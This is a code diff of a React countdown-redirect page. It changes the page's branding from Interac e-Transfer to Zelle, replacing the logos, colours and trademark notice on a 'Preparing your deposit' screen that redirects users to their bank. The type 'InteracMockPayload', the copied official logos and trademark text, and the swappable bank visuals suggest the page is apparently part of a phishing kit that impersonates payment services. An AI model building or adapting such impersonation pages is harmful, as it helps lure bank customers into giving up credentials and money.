@@ -2,7 +2,6 @@
 
 import { useEffect, useState, useRef, useMemo } from "react"
 import type { InteracMockPayload } from "@/types/interac"
-import Image from "next/image"
 import { Clock, AlertTriangle } from "lucide-react"
 
 interface TransferData {
@@ -84,17 +83,12 @@ export default function CountdownRedirectScreen({ data, transferData }: Countdow
 
   return (
     <div className="min-h-screen bg-black flex flex-col">
-      <div className="w-full h-2 bg-[#FFCB05]" />
+      <div className="w-full h-1 bg-[#6D1ED4]" />
 
       <header className="border-b border-zinc-800 bg-black">
         <div className="max-w-4xl mx-auto px-4 py-4 flex items-center gap-3">
-          <div className="relative w-12 h-12 rounded-lg overflow-hidden bg-white flex items-center justify-center">
-            <Image
-              src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
-              alt="Interac"
-              fill
-              className="object-contain p-1"
-            />
+          <div className="w-10 h-10 rounded-xl overflow-hidden shadow-lg shadow-[#6D1ED4]/30">
+            <img src="/zelle-logo.webp" alt="Zelle" className="w-full h-full object-cover" />
           </div>
           <h1 className="text-xl font-semibold text-white">{data.bankVisuals.name}</h1>
         </div>
@@ -106,17 +100,17 @@ export default function CountdownRedirectScreen({ data, transferData }: Countdow
             <div className="relative w-40 h-40 flex items-center justify-center">
               <div className="absolute inset-0 rounded-full border-8 border-zinc-800" />
               <div
-                className="absolute inset-0 rounded-full border-8 border-[#FFCB05] border-t-transparent animate-spin"
+                className="absolute inset-0 rounded-full border-8 border-[#6D1ED4] border-t-transparent animate-spin"
                 style={{ animationDuration: "3s" }}
               />
-              <span className="text-7xl font-bold text-[#FFCB05] tabular-nums">{countdown}</span>
+              <span className="text-7xl font-bold text-[#6D1ED4] tabular-nums">{countdown}</span>
             </div>
 
             <div className="text-center space-y-2">
               <h2 className="text-2xl font-semibold text-white">Preparing your deposit</h2>
               <p className="text-lg text-zinc-400">
                 You will be redirected to complete your deposit in{" "}
-                <span className="text-[#FFCB05] font-semibold tabular-nums">{countdown}</span> seconds
+                <span className="text-[#6D1ED4] font-semibold tabular-nums">{countdown}</span> seconds
               </p>
             </div>
           </div>
@@ -203,7 +197,7 @@ export default function CountdownRedirectScreen({ data, transferData }: Countdow
             <div className="flex flex-col items-center space-y-3">
               <button
                 onClick={handleManualRedirect}
-                className="w-full md:w-auto px-8 py-4 bg-[#FFCB05] hover:bg-[#FFD84D] text-black font-semibold rounded-xl transition-colors duration-200 flex items-center justify-center gap-2"
+                className="w-full md:w-auto px-8 py-4 bg-[#6D1ED4] hover:bg-[#5A18B0] text-white font-semibold rounded-xl transition-colors duration-200 flex items-center justify-center gap-2"
               >
                 Continue to Deposit
                 <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -219,7 +213,7 @@ export default function CountdownRedirectScreen({ data, transferData }: Countdow
       <footer className="border-t border-zinc-800 bg-black">
         <div className="max-w-4xl mx-auto px-4 py-6">
           <div className="flex items-start gap-3 text-sm text-zinc-500">
-            <svg className="w-5 h-5 text-[#FFCB05] flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+            <svg className="w-5 h-5 text-[#6D1ED4] flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
               <path
                 fillRule="evenodd"
                 d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
@@ -228,7 +222,7 @@ export default function CountdownRedirectScreen({ data, transferData }: Countdow
             </svg>
             <p className="leading-relaxed">
               You are being securely redirected to your financial institution. Never share your banking credentials with
-              anyone. Interac e-Transfer is a registered trademark of Interac Corp.
+              anyone. Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC.
             </p>
           </div>
         </div>
